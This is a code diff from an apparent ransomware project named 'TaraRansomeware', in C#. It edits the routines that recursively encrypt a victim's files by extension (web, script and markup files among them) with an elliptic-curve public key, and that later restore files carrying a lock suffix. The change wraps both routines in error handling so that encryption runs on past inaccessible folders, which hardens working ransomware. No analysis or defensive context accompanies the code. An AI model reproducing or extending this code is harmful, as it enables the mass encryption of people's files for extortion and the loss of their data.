@@ -45,23 +45,30 @@ namespace TaraRansomeware.Engines
                 ".php", ".asp", ".aspx", ".html", ".xml", ".py", ".js"
             };
 
-            string[] files = Directory.GetFiles(location);
-            string[] childDirectories = Directory.GetDirectories(location);
-
-            Parallel.ForEach(files, (filePath) =>
+            try
             {
-                string extension = Path.GetExtension(filePath);
-                if (validExtensions.Contains(extension))
+                string[] files = Directory.GetFiles(location);
+                string[] childDirectories = Directory.GetDirectories(location);
+
+                Parallel.ForEach(files, (filePath) =>
                 {
-                    EncryptFile(cipPubKey, Path.GetFullPath(filePath));
-                    Debug.WriteLine(Path.GetFullPath(filePath));
-                }
-            });
+                    string extension = Path.GetExtension(filePath);
+                    if (validExtensions.Contains(extension))
+                    {
+                        EncryptFile(cipPubKey, Path.GetFullPath(filePath));
+                        Debug.WriteLine(Path.GetFullPath(filePath));
+                    }
+                });
 
-            Parallel.ForEach(childDirectories, (subDir) =>
+                Parallel.ForEach(childDirectories, (subDir) =>
+                {
+                    EncryptDirectory(cipPubKey, Path.GetFullPath(subDir));
+                });
+            }
+            catch (System.UnauthorizedAccessException e)
             {
-                EncryptDirectory(cipPubKey, Path.GetFullPath(subDir));
-            });
+                Console.WriteLine(e.Message);
+            }
         }
 
         /// <summary>
@@ -71,24 +78,32 @@ namespace TaraRansomeware.Engines
         /// <param name="location">文件夹位置</param>
         public void DecryptDirectory(ECPrivateKeyParameters cipPrivKey, string location)
         {
-            string[] files = Directory.GetFiles(location);
-            string[] childDirectories = Directory.GetDirectories(location);
             string validExtension = lockSuffix;
 
-            Parallel.ForEach(files, (filePath) =>
+            try
             {
-                string extension = Path.GetExtension(filePath);
-                if (extension == validExtension)
-                {
-                    Console.WriteLine(Path.GetFullPath(filePath));
-                    RestoreFile(cipPrivKey, Path.GetFullPath(filePath));
-                }
-            });
+                string[] files = Directory.GetFiles(location);
+                string[] childDirectories = Directory.GetDirectories(location);
 
-            Parallel.ForEach(childDirectories, (subDir) =>
+                Parallel.ForEach(files, (filePath) =>
+                {
+                    string extension = Path.GetExtension(filePath);
+                    if (extension == validExtension)
+                    {
+                        Console.WriteLine(Path.GetFullPath(filePath));
+                        RestoreFile(cipPrivKey, Path.GetFullPath(filePath));
+                    }
+                });
+
+                Parallel.ForEach(childDirectories, (subDir) =>
+                {
+                    DecryptDirectory(cipPrivKey, Path.GetFullPath(subDir));
+                });
+            }
+            catch (System.UnauthorizedAccessException e)
             {
-                DecryptDirectory(cipPrivKey, Path.GetFullPath(subDir));
-            });
+                Console.WriteLine(e.Message);
+            }
         }
 
         /// <summary>
